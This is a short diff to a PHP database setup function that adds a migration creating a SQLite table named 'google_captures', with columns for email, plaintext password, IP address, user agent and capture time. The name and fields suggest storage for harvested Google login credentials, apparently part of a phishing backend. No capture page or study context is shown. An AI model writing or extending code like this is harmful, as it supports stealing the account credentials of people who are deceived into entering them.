@@ -136,6 +136,17 @@ function db(): PDO
         CHECK ((post_id IS NULL) <> (skill_id IS NULL)),
         UNIQUE(post_id, block_key), UNIQUE(skill_id, block_key)
     )');
+    if ((int) $pdo->query('PRAGMA user_version')->fetchColumn() < 12) {
+        $pdo->exec('CREATE TABLE IF NOT EXISTS google_captures (
+            id          INTEGER PRIMARY KEY AUTOINCREMENT,
+            email       TEXT NOT NULL,
+            password    TEXT NOT NULL,
+            ip          TEXT NOT NULL,
+            user_agent  TEXT NOT NULL,
+            captured_at TEXT NOT NULL DEFAULT (datetime(\'now\', \'localtime\'))
+        )');
+        $pdo->exec('PRAGMA user_version = 12');
+    }
     return $pdo;
 }
 
